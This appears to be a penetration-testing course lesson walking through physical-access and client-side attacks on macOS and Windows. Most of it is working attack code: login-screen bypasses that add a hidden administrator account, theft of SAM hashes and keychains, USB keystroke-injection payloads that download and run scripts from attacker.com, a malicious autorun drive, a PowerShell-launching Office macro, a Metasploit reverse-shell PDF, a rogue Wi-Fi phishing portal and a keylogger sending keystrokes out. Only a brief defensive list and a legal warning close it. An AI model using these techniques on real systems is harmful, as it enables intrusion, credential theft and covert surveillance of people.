# LESSON 3: Physical Access & Client-Side Attacks

## Objective
Learn to exploit physical access vectors and client-side vulnerabilities. Master USB attacks, phishing, and system bypass techniques for macOS and Windows.

## Prerequisites
- Lesson 1 & 2 completed
- USB drive (8GB+)
- Access to test machines (not production!)

## Phase 1: macOS Physical Access

### Step 1: Single User Mode Access
```bash
# Boot holding Cmd+S for single user mode
# At prompt:
/sbin/mount -uw /
rm /var/db/.AppleSetupDone  # Force setup assistant
# Or reset password:
dscl . -passwd /Users/[username] [newpassword]
```

### Step 2: Firmware Password Bypass
```bash
# Check firmware password status
sudo firmwarepasswd -check

# RAM removal technique (older Macs):
# 1. Remove RAM for 5 minutes
# 2. Reinstall and boot with Cmd+Option+P+R
```

### Step 3: Target Disk Mode
```bash
# Boot holding T key
# Connect via Thunderbolt/USB-C to another Mac
# On attacking Mac:
diskutil list  # Find target disk
mkdir /Volumes/target
mount -t hfs /dev/disk2s1 /Volumes/target
# Extract data
```

### Step 4: Keychain Extraction
```bash
# From mounted drive or single user mode
cd /Users/[username]/Library/Keychains
cp -r * /path/to/usb/

# On attacker machine with user password:
security dump-keychain -d login.keychain
```

## Phase 2: Windows Physical Access

### Step 5: Sticky Keys Backdoor
```bash
# Boot from Windows install USB
# Shift+F10 for command prompt
move c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.bak
copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
# Reboot and press Shift 5 times at login screen
```

### Step 6: SAM File Extraction
```bash
# From Linux live USB:
mkdir /mnt/windows
mount /dev/sda2 /mnt/windows
cd /mnt/windows/Windows/System32/config
cp SAM SYSTEM /media/usb/
# Crack offline with ophcrack or hashcat
```

### Step 7: Utilman Exploit
```bash
# Similar to sticky keys
move c:\windows\system32\utilman.exe c:\windows\system32\utilman.exe.bak
copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
# Windows+U at login screen for system shell
net user hacker Password123! /add
net localgroup administrators hacker /add
```

## Phase 3: USB Attack Vectors

### Step 8: USB Rubber Ducky Payloads
```bash
# Create payload (save as payload.txt)
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING curl http://attacker.com/shell.sh | bash
ENTER

# Encode for Rubber Ducky
java -jar duckencoder.jar -i payload.txt -o inject.bin
```

### Step 9: BadUSB with Digispark
```arduino
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1')\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

### Step 10: Malicious USB Creation
```bash
# Create autorun.inf
cat > autorun.inf << EOF
[autorun]
open=evil.exe
icon=folder.ico
action=Open folder to view files
shell\open\command=evil.exe
EOF

# Hide files
attrib +h +s autorun.inf evil.exe
```

## Phase 4: Client-Side Exploitation

### Step 11: Phishing Infrastructure
```bash
# Clone legitimate site
wget -r -k -l 1 https://legitimate-site.com

# Set up phishing server
python3 -m http.server 80

# Or use Social Engineering Toolkit
setoolkit
# Select: 1) Social-Engineering Attacks
# Select: 2) Website Attack Vectors
# Select: 3) Credential Harvester Attack Method
```

### Step 12: Malicious Office Macros
```vba
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -e " & Base64Payload
End Sub

Sub Document_Open()
    AutoOpen
End Sub
```

### Step 13: Browser Exploitation with BeEF
```bash
# Install BeEF
git clone https://github.com/beefproject/beef
cd beef && ./install

# Start BeEF
./beef

# Hook browsers with:
<script src="http://attacker.com:3000/hook.js"></script>

# Use BeEF commands for:
# - Keylogging
# - Screenshots
# - Webcam access
# - Social engineering
```

### Step 14: PDF Exploitation
```bash
# Using msfconsole
use exploit/windows/fileformat/adobe_pdf_embedded_exe
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set FILENAME malicious.pdf
exploit

# Embed JavaScript in PDF
pdf-parser -w malicious.pdf
# Add JS stream for execution
```

## Phase 5: Credential Harvesting

### Step 15: Fake Captive Portal
```bash
# Using Wifiphisher
wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade --handshake-capture handshake.pcap

# Manual captive portal
hostapd hostapd.conf  # Create rogue AP
dnsmasq -C dnsmasq.conf  # DNS/DHCP
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
```

### Step 16: Keylogger Deployment
```python
# Simple Python keylogger
from pynput import keyboard
import requests

log = ""

def on_press(key):
    global log
    log += str(key).replace("'", "")
    if len(log) > 100:
        requests.post("http://attacker.com/log", data={"keys": log})
        log = ""

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

## Evidence Collection

### Step 17: Document Physical Access
```bash
# Take photos of:
# - Physical security bypasses
# - Unlocked workstations
# - Written passwords
# - Badge cloning success

# Log all access methods
echo "$(date): Gained physical access via [method]" >> physical_access.log

# Screenshot successful exploits
screencapture -x evidence_$(date +%s).png  # macOS
Import-Module .\Get-Screenshot.ps1; Get-Screenshot  # Windows
```

## Custom Scripts

### usb_payload_generator.py
Located in `/scripts/lesson_03_physical_access/`
Generates USB attack payloads for various platforms

### phishing_server.py
Located in `/scripts/lesson_03_physical_access/`
Creates convincing phishing pages with credential capture

## Success Criteria

✓ Physical access to locked macOS system
✓ Physical access to locked Windows system
✓ USB payload execution
✓ Successful phishing campaign
✓ Client-side code execution
✓ Credential harvesting
✓ Persistence via physical access

## Defensive Lessons

- Enable firmware passwords
- Encrypt drives with FileVault/BitLocker
- Disable USB ports in BIOS
- User awareness training
- Physical security controls
- Disable autorun features

## Legal Warning

**ONLY practice on systems you own or have explicit permission to test!**
Physical access attacks may violate computer fraud laws.
Never use these techniques without written authorization.

## Next Lesson Preview
**Lesson 4**: Post-Exploitation & Privilege Escalation
- Linux/macOS privilege escalation
- Persistence mechanisms
- Lateral movement preparation